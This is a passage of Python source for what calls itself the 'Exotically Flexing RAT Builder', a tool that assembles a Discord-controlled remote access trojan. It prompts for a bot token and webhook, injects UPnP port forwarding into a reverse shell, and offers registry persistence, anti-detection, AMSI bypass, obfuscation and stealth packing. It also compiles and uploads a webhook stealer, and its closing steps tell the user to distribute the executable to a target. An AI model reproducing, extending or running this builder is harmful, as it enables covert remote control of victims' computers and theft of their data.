            process = subprocess.run(fallback_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
            
            if process.returncode != 0:
                print(f"{Fore.RED}[!] Alternative compilation method also failed.{Style.RESET_ALL}")
                error_lines = process.stderr.decode(errors='replace').splitlines()
                if error_lines:
                    print(f"{Fore.RED}[!] Error details:{Style.RESET_ALL}")
                    for line in error_lines[-10:]:
                        print(f"{Fore.RED}    {line}{Style.RESET_ALL}")
                return False
        
        # Check if the executable was successfully created
        exe_path = os.path.join("dist", f"{output_name}.exe")
        if os.path.exists(exe_path):
            print(f"{Fore.GREEN}[+] Compilation successful!{Style.RESET_ALL}")
            
            # Copy to the current directory
            shutil.copy(exe_path, f"{output_name}.exe")
            print(f"{Fore.GREEN}[+] Executable copied to: {output_name}.exe{Style.RESET_ALL}")
            
            # Show file size information
            file_size_bytes = os.path.getsize(f"{output_name}.exe")
            file_size_mb = file_size_bytes / (1024 * 1024)
            print(f"{Fore.GREEN}[+] File size: {file_size_mb:.2f} MB{Style.RESET_ALL}")
            
            # Apply packing if requested
            if packer:
                print(f"{Fore.CYAN}[*] Applying {packer} packing...{Style.RESET_ALL}")
                pack_executable(f"{output_name}.exe", packer)
                
                # Show size after packing
                packed_size_bytes = os.path.getsize(f"{output_name}.exe")
                packed_size_mb = packed_size_bytes / (1024 * 1024)
                
                # Calculate size reduction
                if file_size_bytes > 0:
                    reduction = (1 - (packed_size_bytes / file_size_bytes)) * 100
                    print(f"{Fore.GREEN}[+] Size after packing: {packed_size_mb:.2f} MB ({reduction:.1f}% reduction){Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}[+] Size after packing: {packed_size_mb:.2f} MB{Style.RESET_ALL}")
            
            # Clean up temporary files
            print(f"{Fore.CYAN}[*] Cleaning up temporary files...{Style.RESET_ALL}")
            try:
                cleanup_files = [
                    "build", 
                    "dist", 
                    f"{output_name}.spec", 
                    "random_data.txt"
                ]
                
                for item in cleanup_files:
                    if os.path.isdir(item):
                        shutil.rmtree(item, ignore_errors=True)
                    elif os.path.exists(item):
                        os.remove(item)
                        
                print(f"{Fore.GREEN}[+] Cleanup completed successfully.{Style.RESET_ALL}")
            except Exception as cleanup_error:
                print(f"{Fore.YELLOW}[!] Warning: Some temporary files could not be cleaned up: {str(cleanup_error)}{Style.RESET_ALL}")
            
            return True
        
        print(f"{Fore.RED}[!] Compilation completed but executable was not found at expected location: {exe_path}{Style.RESET_ALL}")
        return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error during compilation: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
        return False

def enhance_remote_shell_with_upnp():
    """Add UPNP port forwarding to the remote shell code for better connectivity."""
    try:
        print(f"{Fore.CYAN}[*] Adding UPNP port forwarding capability to remote shell...{Style.RESET_ALL}")
        
        # Check if rat_source.py exists
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py not found. Cannot enhance remote shell.{Style.RESET_ALL}")
            return False
            
        with open("rat_source.py", "r", encoding="utf-8") as f:
            content = f.read()
            
        # Add required import if not already present
        if "import miniupnpc" not in content:
            # Find a good place to add the import (after other imports)
            import_section_end = content.find("appdata = os.getenv('APPDATA')")
            
            # Ensure import is wrapped in try/except to avoid errors if module is missing
            upnp_import = """
# Add UPNP support for port forwarding if available
try:
    import miniupnpc
except ImportError:
    pass
"""
            if import_section_end > 0:
                content = content[:import_section_end] + upnp_import + content[import_section_end:]
                
        # Look for the start_reverse_shell function
        start_shell_func = "async def start_reverse_shell"
        if start_shell_func in content:
            # Find the function and add UPNP port forwarding capability
            shell_func_start = content.find(start_shell_func)
            if shell_func_start > 0:
                # Find the end of the function header
                func_header_end = content.find(":", shell_func_start) + 1
                
                # UPNP port forwarding code to inject
                upnp_code = """
        # Try UPNP port forwarding if available
        try:
            if 'miniupnpc' in sys.modules:
                upnp = miniupnpc.UPnP()
                upnp.discoverdelay = 10
                upnp.discover()
                upnp.selectigd()
                
                # If no port specified, use a random one
                if port == 0:
                    port = random.randint(20000, 65000)
                
                # Try to forward the port
                result = upnp.addportmapping(port, 'TCP', upnp.lanaddr, port, 
                                            f'DiscordRAT_{port}', '')
                if result:
                    print(f"[*] Successfully forwarded port {port} using UPNP")
        except Exception as e:
            print(f"[!] UPNP port forwarding failed: {str(e)}")
"""
                # Insert UPNP code after function header
                content = content[:func_header_end] + upnp_code + content[func_header_end:]
                
                # Write back to the file
                with open("rat_source.py", "w", encoding="utf-8") as f:
                    f.write(content)
                    
                print(f"{Fore.GREEN}[+] Successfully enhanced remote shell with UPNP port forwarding!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Note: This requires the 'miniupnpc' module to work. It will be installed if missing.{Style.RESET_ALL}")
                
                # Add miniupnpc to requirements
                with open("requirements.txt", "r", encoding="utf-8") as f:
                    req_content = f.read()
                    
                if "miniupnpc" not in req_content:
                    with open("requirements.txt", "a", encoding="utf-8") as f:
                        f.write("\nminiupnpc\n")
                        
                # Try to ensure miniupnpc is installed
                try:
                    subprocess.run([sys.executable, "-m", "pip", "install", "miniupnpc", "--no-warn-script-location"], 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
                except:
                    pass
                
                return True
            else:
                print(f"{Fore.YELLOW}[!] Could not find start_reverse_shell function to enhance.{Style.RESET_ALL}")
                return False
        else:
            print(f"{Fore.YELLOW}[!] Remote shell function not found in rat_source.py{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error enhancing remote shell: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    """Main function to run the RAT builder."""
    print_banner()
    
    # Check requirements first
    print(f"{Fore.CYAN}[✧] Checking requirements...{Style.RESET_ALL}")
    if not check_requirements():
        print(f"{Fore.RED}[✗] Requirements check failed. Please install the required dependencies.{Style.RESET_ALL}")
        return
    
    # Display disclaimer
    print(f"\n{Fore.YELLOW}[❀] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[❀] The authors are not responsible for any misuse or damage.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[❀] By continuing, you agree to use this responsibly and legally.{Style.RESET_ALL}\n")
    
    agree = input(f"{Fore.CYAN}[✿] Do you agree? (y/n): {Style.RESET_ALL}")
    if agree.lower() != 'y':
        print(f"{Fore.RED}[✗] Exiting...{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}[✧] Starting build process...{Style.RESET_ALL}")
    
    # Step 1: Get Discord bot token
    token = input(f"{Fore.YELLOW}[?] Enter your Discord bot token: {Style.RESET_ALL}")
    if not token:
        print(f"{Fore.RED}[!] Token cannot be empty. A Discord bot token is required for the RAT to function.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Create a bot at https://discord.com/developers/applications{Style.RESET_ALL}")
        return
    
    # Step 2: Get webhook (optional)
    webhook = input(f"{Fore.YELLOW}[?] Enter your webhook URL (optional, press Enter to skip): {Style.RESET_ALL}")
    
    # Step 3: Get output name
    output_name = input(f"{Fore.YELLOW}[?] Enter output file name (default: ExoticallyFlexing): {Style.RESET_ALL}")
    if not output_name:
        output_name = "ExoticallyFlexing"
        print(f"{Fore.CYAN}[i] Using default name: {output_name}{Style.RESET_ALL}")
    
    # Step 4: Get icon path (optional)
    icon_path = input(f"{Fore.YELLOW}[?] Enter path to custom icon file (optional, press Enter to skip): {Style.RESET_ALL}")
    if icon_path and not os.path.exists(icon_path):
        print(f"{Fore.YELLOW}[!] Icon file not found at {icon_path}, using default icon.{Style.RESET_ALL}")
        icon_path = None
    
    # Step 5: Configuration options
    print(f"\n{Fore.CYAN}[*] Configuration Options:{Style.RESET_ALL}")
    
    # 5.1: Startup persistence
    startup_choice = input(f"{Fore.YELLOW}[?] Enable registry startup persistence? (y/n, default: n): {Style.RESET_ALL}")
    enable_startup = startup_choice.lower() == 'y'
    
    # 5.2: Anti-detection
    antidect_choice = input(f"{Fore.YELLOW}[?] Enable enhanced anti-detection features? (y/n, default: y): {Style.RESET_ALL}")
    enable_antidetect = antidect_choice.lower() != 'n'
    
    # 5.3: AMSI bypass
    amsi_choice = input(f"{Fore.YELLOW}[?] Enable AMSI bypass? (y/n, default: y): {Style.RESET_ALL}")
    enable_amsi = amsi_choice.lower() != 'n'
    
    # 5.4: File size optimization
    optimize_choice = input(f"{Fore.YELLOW}[?] Optimize file size? (y/n, default: y): {Style.RESET_ALL}")
    enable_optimization = optimize_choice.lower() != 'n'
    
    # 5.5: UPNP port forwarding
    upnp_choice = input(f"{Fore.YELLOW}[?] Add UPNP port forwarding to remote shell? (y/n, default: y): {Style.RESET_ALL}")
    enable_upnp = upnp_choice.lower() != 'n'
    
    # 5.6: Code obfuscation
    obfuscate_choice = input(f"{Fore.YELLOW}[?] Apply code obfuscation? (y/n, default: n): {Style.RESET_ALL}")
    enable_obfuscation = obfuscate_choice.lower() == 'y'
    
    # 5.7: Packing options
    print(f"\n{Fore.CYAN}[*] Executable Packing Options:{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[1] MPRESS (Recommended - Better stealth){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[2] UPX (Not recommended - Higher detection rate){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[3] No packing (Default){Style.RESET_ALL}")
    
    packer_choice = input(f"{Fore.YELLOW}[?] Choose packing option (1-3): {Style.RESET_ALL}")
    packer = None
    if packer_choice == "1":
        packer = "mpress"
        print(f"{Fore.CYAN}[*] Selected MPRESS packer{Style.RESET_ALL}")
        install_packers()
    elif packer_choice == "2":
        packer = "upx"
        print(f"{Fore.CYAN}[*] Selected UPX packer{Style.RESET_ALL}")
        install_packers()
    else:
        print(f"{Fore.CYAN}[*] No packer selected{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[*] Starting build process with selected options...{Style.RESET_ALL}")
    
    # Step 6: Download and prepare RAT source
    print(f"\n{Fore.CYAN}[1/7] Downloading RAT source code...{Style.RESET_ALL}")
    if not download_rat_source():
        print(f"{Fore.RED}[✗] Failed to download or validate RAT source code. Build process cannot continue.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Step 7: Insert token
    print(f"\n{Fore.CYAN}[2/7] Inserting Discord bot token...{Style.RESET_ALL}")
    if not insert_token(token):
        print(f"{Fore.RED}[✗] Failed to insert token. Build process cannot continue.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Step 8: Add UPNP if requested
    print(f"\n{Fore.CYAN}[3/7] Applying customizations to RAT source...{Style.RESET_ALL}")
    if enable_upnp:
        enhance_remote_shell_with_upnp()
    
    # Step 9: Apply code modifications
    if enable_obfuscation:
        print(f"{Fore.CYAN}[*] Applying code obfuscation...{Style.RESET_ALL}")
        obfuscate_code("rat_source.py")
    
    if enable_optimization:
        print(f"{Fore.CYAN}[*] Optimizing file size...{Style.RESET_ALL}")
        optimize_file_size("rat_source.py")
        print(f"{Fore.CYAN}[*] Minimizing imports...{Style.RESET_ALL}")
        minimize_imports("rat_source.py")
    
    if enable_startup:
        print(f"{Fore.CYAN}[*] Adding startup persistence...{Style.RESET_ALL}")
        insert_startup_code(True)
    else:
        insert_startup_code(False)
    
    if enable_antidetect:
        print(f"{Fore.CYAN}[*] Adding anti-detection measures...{Style.RESET_ALL}")
        improve_stealth()
    
    if enable_amsi:
        print(f"{Fore.CYAN}[*] Adding AMSI bypass...{Style.RESET_ALL}")
        add_amsi_bypass()
    
    # Step 10: Process stealer if webhook provided
    print(f"\n{Fore.CYAN}[4/7] Setting up stealer component (if applicable)...{Style.RESET_ALL}")
    stealer_link = None
    if webhook:
        print(f"{Fore.CYAN}[*] Webhook provided, setting up stealer component...{Style.RESET_ALL}")
        # Download stealer source
        if download_stealer_source():
            # Insert webhook
            if insert_webhook(webhook):
                # Compile stealer and upload
                stealer_link = compile_stealer(output_name)
                if stealer_link:
                    # Insert stealer link into RAT source
                    insert_stealer_link(stealer_link)
                    print(f"{Fore.GREEN}[+] Stealer component added successfully!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] Failed to compile stealer component. Continuing without it.{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Failed to insert webhook. Continuing without stealer component.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Failed to download stealer source. Continuing without stealer component.{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[!] No webhook provided. Skipping stealer component.{Style.RESET_ALL}")
    
    # Step 11: Final verification
    print(f"\n{Fore.CYAN}[5/7] Performing final verification...{Style.RESET_ALL}")
    try:
        with open("rat_source.py", "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            if "token = " not in content or "'" + token + "'" not in content.replace('"', "'"):
                print(f"{Fore.RED}[!] Warning: Token might not be properly inserted in source file.{Style.RESET_ALL}")
                fix_token = input(f"{Fore.YELLOW}[?] Attempt to fix token insertion? (y/n): {Style.RESET_ALL}")
                if fix_token.lower() == 'y':
                    insert_token(token)
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Warning: Could not perform final verification: {str(e)}{Style.RESET_ALL}")
    
    # Step 12: Compile RAT
    print(f"\n{Fore.CYAN}[6/7] Compiling final executable...{Style.RESET_ALL}")
    if not compile_rat(output_name, icon_path, packer):
        print(f"{Fore.RED}[✗] Compilation failed. Build process could not be completed.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Step 13: Final steps and cleanup
    print(f"\n{Fore.CYAN}[7/7] Finalizing and cleaning up...{Style.RESET_ALL}")
    try:
        for temp_file in ["rat_source.py", "stealer_source.py", "random_data.txt", "random_data_stealer.txt"]:
            if os.path.exists(temp_file):
                os.remove(temp_file)
                print(f"{Fore.CYAN}[*] Removed temporary file: {temp_file}{Style.RESET_ALL}")
    except Exception as cleanup_error:
        print(f"{Fore.YELLOW}[!] Warning: Could not clean up some temporary files: {str(cleanup_error)}{Style.RESET_ALL}")
    
    # Success message
    print(f"\n{Fore.GREEN}[✓] Build completed successfully!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] Your RAT is ready: {output_name}.exe ({os.path.getsize(f'{output_name}.exe') / 1024 / 1024:.2f} MB){Style.RESET_ALL}")
    if stealer_link:
        print(f"{Fore.GREEN}[✓] Stealer component uploaded to: {stealer_link}{Style.RESET_ALL}")
    
    # Next steps
    print(f"\n{Fore.CYAN}[i] Next steps:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[1] Make sure your Discord bot is online and has proper permissions{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[2] Invite the bot to your server with Administrator permissions{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[3] Distribute {output_name}.exe to your target{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}[i] Thanks for using Exotically Flexing RAT Builder!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] Created by dead exotic & hoa{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] GitHub: https://github.com/deadexotic{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
